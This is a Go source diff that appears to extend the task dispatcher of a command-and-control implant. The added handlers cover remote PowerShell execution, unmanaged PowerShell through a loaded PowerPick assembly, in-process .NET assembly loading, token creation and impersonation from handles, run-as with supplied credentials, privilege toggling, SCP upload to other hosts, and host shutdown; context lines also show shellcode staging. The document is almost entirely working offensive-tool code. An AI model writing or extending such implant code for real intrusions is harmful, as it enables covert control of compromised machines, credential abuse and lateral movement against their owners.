@@ -222,6 +222,47 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, "sleep updated", "")
 
+	case "SLEEP_UNTIL":
+		raw := strings.TrimSpace(task.Args)
+		var ts time.Time
+		var parseErr error
+		ts, parseErr = time.Parse(time.RFC3339, raw)
+		if parseErr != nil {
+			ts, parseErr = time.ParseInLocation("2006-01-02 15:04:05", raw, time.Local)
+		}
+		if parseErr != nil {
+			ts, parseErr = time.ParseInLocation("2006-01-02T15:04:05", raw, time.Local)
+		}
+		if parseErr != nil {
+			t.sendResult(task.ID, "", "invalid time format; use RFC3339 or 'YYYY-MM-DD HH:MM:SS'")
+			return
+		}
+		SleepUntil = ts
+		t.sendResult(task.ID, fmt.Sprintf("[+] sleeping until %s", ts.Format(time.RFC3339)), "")
+
+	case "JOBS":
+		t.sendResult(task.ID, jobList(), "")
+
+	case "SHUTDOWN":
+		reboot := strings.ToLower(strings.TrimSpace(task.Args)) == "reboot"
+		t.sendResult(task.ID, fmt.Sprintf("[+] initiating %s", map[bool]string{true: "reboot", false: "shutdown"}[reboot]), "")
+		go shutdownHost(reboot)
+
+	case "POWERSHELL":
+		var psArgs struct {
+			Cmd   string   `json:"cmd"`
+			Stdin []string `json:"stdin"`
+		}
+		if err := json.Unmarshal([]byte(task.Args), &psArgs); err != nil {
+			psArgs.Cmd = task.Args
+		}
+		out, err := runPowerShell(psArgs.Cmd, psArgs.Stdin)
+		errStr := ""
+		if err != nil {
+			errStr = err.Error()
+		}
+		t.sendResult(task.ID, out, errStr)
+
 	case "CONFIG":
 		var cfg struct {
 			SleepSec     int    `json:"sleep_sec"`
@@ -328,6 +369,33 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, fmt.Sprintf("written %d bytes to %s", len(data), dest), "")
 
+	// ── REMOTE_UPLOAD_SCP ────────────────────────────────────────────────────
+	case "REMOTE_UPLOAD_SCP":
+		var ra struct {
+			Host string `json:"host"`
+			User string `json:"user"`
+			Pass string `json:"pass"`
+			Src  string `json:"src"`
+			Dst  string `json:"dst"`
+		}
+		if err := json.Unmarshal([]byte(task.Args), &ra); err != nil || ra.Host == "" {
+			t.sendResult(task.ID, "", "usage: {\"host\":\"<host:port>\",\"user\":\"u\",\"pass\":\"p\",\"src\":\"/local\",\"dst\":\"/remote\"}")
+			return
+		}
+		if !strings.Contains(ra.Host, ":") {
+			ra.Host += ":22"
+		}
+		data, err := os.ReadFile(ra.Src)
+		if err != nil {
+			t.sendResult(task.ID, "", "read src: "+err.Error())
+			return
+		}
+		if err := scpUpload(ra.Host, ra.User, ra.Pass, ra.Dst, data); err != nil {
+			t.sendResult(task.ID, "", err.Error())
+			return
+		}
+		t.sendResult(task.ID, fmt.Sprintf("[+] uploaded %d bytes to %s:%s", len(data), ra.Host, ra.Dst), "")
+
 	case "STAGE2":
 		if task.Payload == "" {
 			t.sendResult(task.ID, "", "empty shellcode payload")
@@ -374,7 +442,17 @@ func dispatchTask(t transport, task taskWire) {
 			t.sendResult(task.ID, "", "DOTNET_EXEC: base64 decode asm: "+err.Error())
 			return
 		}
-		output, err := forkRunAssembly(asmBytes, da.Args, da.TimeoutSec)
+		mode := "fork"
+		if task.ExecCtx != nil && task.ExecCtx.Mode != "" {
+			mode = strings.ToLower(task.ExecCtx.Mode)
+		}
+		var output string
+		switch mode {
+		case "inproc":
+			output, err = ExecuteAssembly(asmBytes, da.Args, da.Type, da.Method)
+		default:
+			output, err = forkRunAssembly(asmBytes, da.Args, da.TimeoutSec)
+		}
 		errStr := ""
 		if err != nil {
 			errStr = err.Error()
@@ -872,13 +950,140 @@ func dispatchTask(t transport, task taskWire) {
 		t.sendResult(task.ID, out, errStr)
 
 	case "TOKEN_MAKE":
-		// Args: "<domain>\<user> <password>"
-		parts := strings.SplitN(task.Args, " ", 2)
-		if len(parts) < 2 {
-			t.sendResult(task.ID, "", `usage: <domain\user> <password>`)
+		var tm struct {
+			User    string `json:"user"`
+			Pass    string `json:"pass"`
+			NetOnly *bool  `json:"netonly"`
+		}
+		netOnly := true
+		if err := json.Unmarshal([]byte(task.Args), &tm); err == nil && tm.User != "" {
+			if tm.NetOnly != nil {
+				netOnly = *tm.NetOnly
+			}
+		} else {
+			parts := strings.SplitN(task.Args, " ", 2)
+			if len(parts) < 2 {
+				t.sendResult(task.ID, "", `usage: {"user":"DOMAIN\\user","pass":"...","netonly":true} or "domain\\user password"`)
+				return
+			}
+			tm.User = parts[0]
+			tm.Pass = parts[1]
+		}
+		out, err := makeToken(tm.User, tm.Pass, netOnly)
+		errStr := ""
+		if err != nil {
+			errStr = err.Error()
+		}
+		t.sendResult(task.ID, out, errStr)
+
+	case "TOKEN_FROM_HANDLE":
+		raw := strings.TrimSpace(task.Args)
+		var handleVal uint64
+		var parseErr error
+		if strings.HasPrefix(strings.ToLower(raw), "0x") {
+			handleVal, parseErr = strconv.ParseUint(raw[2:], 16, 64)
+		} else {
+			handleVal, parseErr = strconv.ParseUint(raw, 10, 64)
+		}
+		if parseErr != nil {
+			t.sendResult(task.ID, "", "invalid handle value: "+parseErr.Error())
 			return
 		}
-		out, err := makeToken(parts[0], parts[1])
+		out, err := tokenFromHandle(uintptr(handleVal))
+		errStr := ""
+		if err != nil {
+			errStr = err.Error()
+		}
+		t.sendResult(task.ID, out, errStr)
+
+	case "RUN_AS":
+		var ra struct {
+			User string `json:"user"`
+			Pass string `json:"pass"`
+			Cmd  string `json:"cmd"`
+		}
+		if err := json.Unmarshal([]byte(task.Args), &ra); err != nil || ra.Cmd == "" {
+			parts := strings.SplitN(task.Args, " ", 3)
+			if len(parts) < 3 {
+				t.sendResult(task.ID, "", `usage: {"user":"DOMAIN\\user","pass":"...","cmd":"..."} or "user pass cmd"`)
+				return
+			}
+			ra.User, ra.Pass, ra.Cmd = parts[0], parts[1], parts[2]
+		}
+		out, err := runAsCmd(ra.User, ra.Pass, ra.Cmd)
+		errStr := ""
+		if err != nil {
+			errStr = err.Error()
+		}
+		t.sendResult(task.ID, out, errStr)
+
+	case "PRIV_LIST", "PRIVILEGE_LIST":
+		out, err := privList()
+		errStr := ""
+		if err != nil {
+			errStr = err.Error()
+		}
+		t.sendResult(task.ID, out, errStr)
+
+	case "PRIV_ENABLE", "PRIVILEGE_ENABLE":
+		out, err := privEnable(task.Args)
+		errStr := ""
+		if err != nil {
+			errStr = err.Error()
+		}
+		t.sendResult(task.ID, out, errStr)
+
+	case "PRIV_DISABLE", "PRIVILEGE_DISABLE":
+		out, err := privDisable(task.Args)
+		errStr := ""
+		if err != nil {
+			errStr = err.Error()
+		}
+		t.sendResult(task.ID, out, errStr)
+
+	case "ASM_STORE_LOAD":
+		parts := strings.SplitN(strings.TrimSpace(task.Args), " ", 2)
+		if len(parts) < 2 {
+			t.sendResult(task.ID, "", "usage: ASM_STORE_LOAD <name> <base64_exe>")
+			return
+		}
+		asmBytes, err := base64.StdEncoding.DecodeString(strings.TrimSpace(parts[1]))
+		if err != nil {
+			t.sendResult(task.ID, "", "base64 decode: "+err.Error())
+			return
+		}
+		asmStoreLoad(strings.TrimSpace(parts[0]), asmBytes)
+		t.sendResult(task.ID, fmt.Sprintf("[+] loaded %d bytes as '%s'", len(asmBytes), strings.TrimSpace(parts[0])), "")
+
+	case "ASM_STORE_LIST":
+		t.sendResult(task.ID, asmStoreList(), "")
+
+	case "ASM_STORE_UNLOAD":
+		t.sendResult(task.ID, asmStoreUnload(strings.TrimSpace(task.Args)), "")
+
+	case "POWERPICK":
+		script := strings.TrimSpace(task.Args)
+		if script == "" {
+			t.sendResult(task.ID, "", "usage: POWERPICK <powershell script>")
+			return
+		}
+		asmBytes, ok := asmStoreGet("powerpick")
+		if !ok && task.Payload != "" {
+			var err error
+			asmBytes, err = base64.StdEncoding.DecodeString(task.Payload)
+			if err != nil {
+				t.sendResult(task.ID, "", "base64 decode payload: "+err.Error())
+				return
+			}
+			asmStoreLoad("powerpick", asmBytes)
+		}
+		if asmBytes == nil {
+			t.sendResult(task.ID, "",
+				"POWERPICK: no assembly loaded. Load SharpPick/PowerPick first:\n"+
+					"  ASM_STORE_LOAD powerpick <base64_exe>")
+			return
+		}
+		out, err := powerpickRun(asmBytes, script)
 		errStr := ""
 		if err != nil {
 			errStr = err.Error()
